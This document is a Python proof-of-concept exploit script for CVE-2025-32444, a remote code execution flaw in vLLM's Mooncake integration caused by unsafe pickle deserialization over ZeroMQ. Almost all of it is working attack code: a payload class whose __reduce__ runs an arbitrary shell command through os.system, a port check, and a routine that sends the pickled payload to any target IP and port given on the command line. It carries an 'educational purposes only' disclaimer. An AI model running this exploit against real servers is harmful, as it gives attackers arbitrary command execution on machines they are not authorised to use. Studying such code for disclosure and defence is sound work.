#!/usr/bin/env python3
"""
vLLM Mooncake Integration RCE Exploit - Proof of Concept (CVE-2025-32444)

This script demonstrates the remote code execution vulnerability in vLLM's Mooncake integration
due to insecure pickle deserialization in ZeroMQ communication.

The vulnerability exists in the wait_for_ack method of MooncakeTransferEngine class, where
recv_pyobj() is used to deserialize data from the network without validation.

For educational purposes only. Do not use against systems without permission.

Usage:
  python3 vllm_mooncake_exploit_poc.py <target_ip> <target_port> <command>

Example:
  python3 vllm_mooncake_exploit_poc.py 192.168.1.100 50010 "touch /tmp/pwned"
"""

import pickle
import os
import sys
import zmq
import socket
from typing import Optional


class RCEPayload:
    """Malicious payload class that will execute arbitrary commands when unpickled"""
    def __reduce__(self):
        # This will execute the specified command when the object is unpickled
        return (os.system, (self.cmd,))
    
    def __init__(self, cmd: str):
        self.cmd = cmd


def print_banner():
    """Print the exploit banner"""
    banner = """
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║  vLLM Mooncake Integration RCE Exploit (CVE-2025-32444)           ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

This proof-of-concept demonstrates the remote code execution vulnerability
in vLLM's Mooncake integration due to insecure pickle deserialization.
"""
    print(banner)


def scan_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """Check if a port is open on the target host"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False


def send_exploit(target_host: str, target_port: int, command: str) -> None:
    """
    Send the exploit payload to the target using ZeroMQ
    """
    try:
        # Check if the port is open
        print(f"[*] Checking if port {target_port} is open on {target_host}...")
        if not scan_port(target_host, target_port):
            print(f"[-] Port {target_port} is not open on {target_host}")
            print("[-] The target may not be running vLLM with Mooncake integration")
            print("[-] or the port might be filtered by a firewall.")
            return
        
        # Create ZeroMQ context and socket
        print(f"[*] Port {target_port} is open. Setting up ZeroMQ connection...")
        context = zmq.Context()
        
        # We need to use PUSH socket type to match the PULL socket in the target
        exploit_socket = context.socket(zmq.PUSH)
        
        # Connect to the target
        print(f"[*] Connecting to {target_host}:{target_port}...")
        exploit_socket.connect(f"tcp://{target_host}:{target_port}")
        
        # Create the malicious pickle payload
        print(f"[*] Creating malicious payload to execute: {command}")
        malicious_object = RCEPayload(command)
        
        # Send the payload
        print("[*] Sending exploit payload...")
        exploit_socket.send_pyobj(malicious_object)
        
        print(f"[+] Exploit sent to {target_host}:{target_port}")
        print("[*] If successful, the command should have executed on the target")
        
        # Clean up
        exploit_socket.close()
        context.term()
        
    except Exception as e:
        print(f"[-] Exploit failed: {str(e)}")


def main():
    """Main function"""
    print_banner()
    
    # Simple command-line argument parsing
    if len(sys.argv) < 4:
        print("Usage:")
        print(f"  {sys.argv[0]} <target_ip> <target_port> <command>")
        print()
        print("Example:")
        print(f"  {sys.argv[0]} 192.168.1.100 50010 \"touch /tmp/pwned\"")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    command = sys.argv[3]
    
    # Execute the exploit
    send_exploit(target_ip, target_port, command)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit aborted by user")
        sys.exit(0)